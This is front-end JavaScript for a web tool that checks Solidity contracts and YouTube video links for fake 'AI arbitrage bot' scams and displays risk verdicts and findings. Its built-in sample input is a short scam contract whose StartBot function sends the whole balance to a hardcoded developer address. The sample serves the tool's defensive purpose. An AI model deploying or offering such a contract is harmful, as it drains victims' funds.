// All untrusted text (contract code, video text, LLM output) is inserted with
// textContent / escaped, never as raw HTML.
const $ = (id) => document.getElementById(id);

function el(tag, attrs = {}, ...kids) {
  const n = document.createElement(tag);
  for (const [k, v] of Object.entries(attrs)) {
    if (k === "class") n.className = v; else n.setAttribute(k, v);
  }
  for (const k of kids) n.append(k instanceof Node ? k : document.createTextNode(String(k ?? "")));
  return n;
}

// Tiny, safe markdown subset: **bold**, `code`, "- " bullets, paragraphs.
function renderMarkdown(text) {
  const wrap = el("div", { class: "explain" });
  let list = null;
  const inline = (line) => {
    const frag = document.createDocumentFragment();
    const parts = line.split(/(\*\*[^*]+\*\*|`[^`]+`)/g);
    for (const p of parts) {
      if (p.startsWith("**") && p.endsWith("**") && p.length > 4) frag.append(el("b", {}, p.slice(2, -2)));
      else if (p.startsWith("`") && p.endsWith("`") && p.length > 2) frag.append(el("code", {}, p.slice(1, -1)));
      else frag.append(document.createTextNode(p));
    }
    return frag;
  };
  for (const raw of text.split("\n")) {
    const line = raw.trimEnd();
    const m = line.match(/^\s*[-*•]\s+(.*)$/);
    if (m) {
      if (!list) { list = el("ul"); wrap.append(list); }
      list.append(el("li", {}, inline(m[1])));
      continue;
    }
    list = null;
    if (!line.trim()) continue;
    const h = line.match(/^#{1,4}\s+(.*)$/);
    wrap.append(h ? el("p", {}, el("b", {}, h[1])) : el("p", {}, inline(line)));
  }
  return wrap;
}

const TRADES = { yes: "Yes", no: "No", unknown: "Unknown" };
const FORWARDS = { yes: "Yes", no_evidence: "No evidence", unknown: "Unknown" };

function render(r) {
  const out = $("out");
  out.replaceChildren();
  const v = r.verdict;
  out.append(el("div", { class: `card verdict ${v.level}` },
    el("h2", {}, v.headline),
    el("div", { class: "pills" },
      el("span", { class: "pill" }, "Actually trades: ", el("b", {}, TRADES[v.trades] || v.trades)),
      el("span", { class: "pill" }, "Forwards funds to someone else: ", el("b", {}, FORWARDS[v.forwards_funds] || v.forwards_funds)),
      el("span", { class: "pill" }, "Risk score: ", el("b", {}, `${v.score}/100`)),
      el("span", { class: "pill" }, "Input: ", el("b", {}, r.input_type)))));

  const ex = r.explanation;
  const exCard = el("div", { class: "card" }, el("h3", {}, "What this means"), renderMarkdown(ex.text));
  exCard.append(el("div", { class: "muted" }, ex.source.startsWith("llm") ? `Explained by ${ex.source.slice(4)}. The verdict above comes from static checks, not the AI.` : (ex.note || "Deterministic explanation.")));
  out.append(exCard);

  if (r.video) {
    const vc = el("div", { class: "card" }, el("h3", {}, "Video"),
      el("div", {}, el("b", {}, r.video.title), " · ", r.video.channel),
      el("div", { class: "muted" }, `Transcript: ${r.video.transcript_source || "not available"} · Code links: ${r.video.code_links.length}`));
    for (const c of r.video.fetched_code) {
      vc.append(el("div", { class: "muted" }, `${c.ok ? "✓ fetched" : "✗ failed"}: ${c.url}${c.ok ? (c.is_solidity ? " (Solidity)" : " (not Solidity)") : " (" + c.error + ")"}`));
    }
    out.append(vc);
  }

  const findings = (r.analysis?.findings || []).concat((r.narrative_flags || []).map(n => ({ ...n, detail: "From the video: \u201c" + n.evidence + "\u201d" })));
  if (findings.length) {
    const fc = el("div", { class: "card" }, el("h3", {}, `Findings (${findings.length})`));
    for (const f of findings) {
      const row = el("div", { class: "finding" },
        el("div", { class: "t" }, el("span", { class: `sev ${f.severity}` }, f.severity), f.title, f.line ? el("span", { class: "muted" }, `  line ${f.line}`) : ""),
        el("div", { class: "d" }, f.detail || ""));
      if (f.evidence && !f.rule_id.startsWith("NO_") && f.detail?.indexOf(f.evidence) === -1) row.append(el("pre", {}, f.evidence));
      fc.append(row);
    }
    out.append(fc);
  }

  const sinks = r.analysis?.sinks || [];
  if (sinks.length) {
    const sc = el("div", { class: "card" }, el("h3", {}, "Where money can leave the contract"));
    for (const s of sinks) {
      sc.append(el("div", { class: "finding" },
        el("div", { class: "t" }, `${s.function}() line ${s.line}: ${s.kind} → ${s.recipient_class}${s.sweeps_balance ? " (entire balance)" : ""}`),
        el("pre", {}, s.snippet)));
    }
    out.append(sc);
  }
  if (r.errors?.length) out.append(el("div", { class: "card err" }, ...r.errors.map(e => el("div", {}, "⚠ " + e))));
}

async function run() {
  const input = $("input").value;
  if (!input.trim()) return;
  $("go").disabled = true; $("go").textContent = "Checking…";
  $("out").replaceChildren(el("div", { class: "card muted" }, "Analysing… (YouTube links take a few seconds)"));
  try {
    const res = await fetch("/api/check", { method: "POST", headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ input, llm: $("llm").checked }) });
    const data = await res.json();
    if (!res.ok) throw new Error(data.error || res.statusText);
    render(data);
  } catch (e) {
    $("out").replaceChildren(el("div", { class: "card err" }, "Error: " + e.message));
  } finally {
    $("go").disabled = false; $("go").textContent = "Check it";
  }
}

const SAMPLE = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// AI Arbitrage Bot v4 - ChatGPT powered front-running bot
contract AIArbitrageBot {
    address public owner;
    address private constant DEV = 0x3cA8f5DbE6a1a62B07C4cAd1A3c3a6f1e1F8f0b2;

    constructor() { owner = msg.sender; }
    receive() external payable {}

    function StartBot() external {
        require(msg.sender == owner, "not owner");
        payable(DEV).transfer(address(this).balance);
    }
}`;

$("go").addEventListener("click", run);
$("sample").addEventListener("click", () => { $("input").value = SAMPLE; });
$("input").addEventListener("keydown", (e) => { if ((e.metaKey || e.ctrlKey) && e.key === "Enter") run(); });
